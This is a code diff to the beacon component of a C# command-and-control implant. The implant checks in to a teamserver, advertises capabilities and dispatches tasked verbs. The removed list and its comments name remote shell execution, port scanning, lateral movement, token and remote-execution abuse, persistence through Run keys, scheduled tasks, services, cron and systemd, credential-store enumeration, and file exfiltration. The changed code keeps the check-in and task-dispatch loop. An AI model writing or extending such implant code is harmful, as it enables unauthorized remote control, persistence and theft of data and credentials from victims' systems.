@@ -27,35 +27,6 @@ namespace Rod.Implant.Internal;
 /// </summary>
 internal sealed class Beacon
 {
-    // The capability verbs the reference implant advertises at handshake
-    // (architecture.md Sec 10). The teamserver gates dispatch on these: the core
-    // shell verb, the three recon verbs the runner implements, the lateral
-    // verbs (move for child derivation; token and exec_remote for the standard
-    // access-token and remote-execution surfaces per ADR 0004), the persist
-    // verbs (install/remove/list for the documented Run/schtasks/service/cron/
-    // systemd mechanisms per ADR 0004), the collect verbs (file for filesystem
-    // reads with chunked-streaming for large files; cred for standard
-    // credential-store enumeration without dumping secret material), and the
-    // exfil verbs (push to stream a file as ExfilChunk frames terminating at the
-    // artifact store; stage to report the local staging manifest).
-    private static readonly string[] Caps =
-    {
-        "shell.exec",
-        "recon.portscan",
-        "recon.hostenum",
-        "recon.service",
-        "lateral.move",
-        "lateral.token",
-        "lateral.exec_remote",
-        "persist.install",
-        "persist.remove",
-        "persist.list",
-        "collect.file",
-        "collect.cred",
-        "exfil.push",
-        "exfil.stage",
-    };
-
     private readonly string _beaconUrl;
     private readonly string _implantId;
     private readonly X509Certificate2 _leaf;
@@ -64,24 +35,30 @@ internal sealed class Beacon
     private readonly TimeSpan _sleep;
     private readonly TimeSpan _jitter;
     private readonly DateTimeOffset? _killDate;
-    private readonly Runner _runner;
+    private readonly HandlerRegistry _handlers;
+    private readonly IReadOnlyList<string> _classVerbs;
     private readonly TextWriter _log;
 
+    /// <summary>
+    /// Builds a Beacon whose handler registry carries no enroll bundle, so the
+    /// lateral.move handler reports derivation as unavailable.
+    /// </summary>
     public Beacon(string beaconUrl, string implantId, X509Certificate2 leaf, RSA privateKey,
         IReadOnlyList<X509Certificate2> cas, TimeSpan sleep, TimeSpan jitter, DateTimeOffset? killDate,
-        TextWriter log)
-        : this(beaconUrl, implantId, leaf, privateKey, cas, sleep, jitter, killDate, enroll: null, log)
+        IReadOnlyList<string> classVerbs, TextWriter log)
+        : this(beaconUrl, implantId, leaf, privateKey, cas, sleep, jitter, killDate, enroll: null, classVerbs, log)
     {
     }
 
     /// <summary>
     /// Builds a Beacon whose lateral.move handler can derive a child using
     /// <paramref name="enroll"/> (architecture.md Sec 10.1). A null bundle leaves
-    /// derivation disabled and the runner behaves as the simpler constructor.
+    /// derivation disabled. <paramref name="classVerbs"/> is the baked class
+    /// verb set; the advertised capability set derives from it (Sec 5.3).
     /// </summary>
     public Beacon(string beaconUrl, string implantId, X509Certificate2 leaf, RSA privateKey,
         IReadOnlyList<X509Certificate2> cas, TimeSpan sleep, TimeSpan jitter, DateTimeOffset? killDate,
-        EnrollBundle? enroll, TextWriter log)
+        EnrollBundle? enroll, IReadOnlyList<string> classVerbs, TextWriter log)
     {
         _beaconUrl = beaconUrl;
         _implantId = implantId;
@@ -91,7 +68,8 @@ internal sealed class Beacon
         _sleep = sleep;
         _jitter = jitter;
         _killDate = killDate;
-        _runner = enroll is null ? new Runner() : new Runner(enroll);
+        _handlers = HandlerRegistry.Default(enroll);
+        _classVerbs = classVerbs;
         _log = log;
     }
 
@@ -195,12 +173,16 @@ internal sealed class Beacon
         using var call = client.CheckIn(cancellationToken: cancellationToken);
 
         // The implant speaks first: handshake with its protocol version and identity.
+        // The advertised capability set is the baked class verbs intersected with
+        // the compiled handlers (architecture.md Sec 5.3), so the teamserver only
+        // ever dispatches verbs this binary can run -- never an advertised verb
+        // with no handler behind it.
         var handshake = new HandshakeRequest
         {
             Version = new ProtocolVersion { Major = 1, Minor = 0 },
             ImplantId = _implantId,
         };
-        handshake.Capabilities.Add(Caps);
+        handshake.Capabilities.Add(_handlers.AdvertisedVerbs(_classVerbs));
         await call.RequestStream.WriteAsync(new Frame { Payload = ByteString.CopyFrom(handshake.ToByteArray()) });
 
         if (!await call.ResponseStream.MoveNext(cancellationToken))
@@ -222,7 +204,7 @@ internal sealed class Beacon
         {
             var frame = call.ResponseStream.Current;
             var task = TaskRequest.Parser.ParseFrom(frame.Payload);
-            var (outcome, output, chunks) = _runner.Dispatch(task.Verb, task.Arguments);
+            var (outcome, output, chunks) = _handlers.Dispatch(task.Verb, task.Arguments);
             var result = new TaskResult
             {
                 TaskId = task.TaskId,
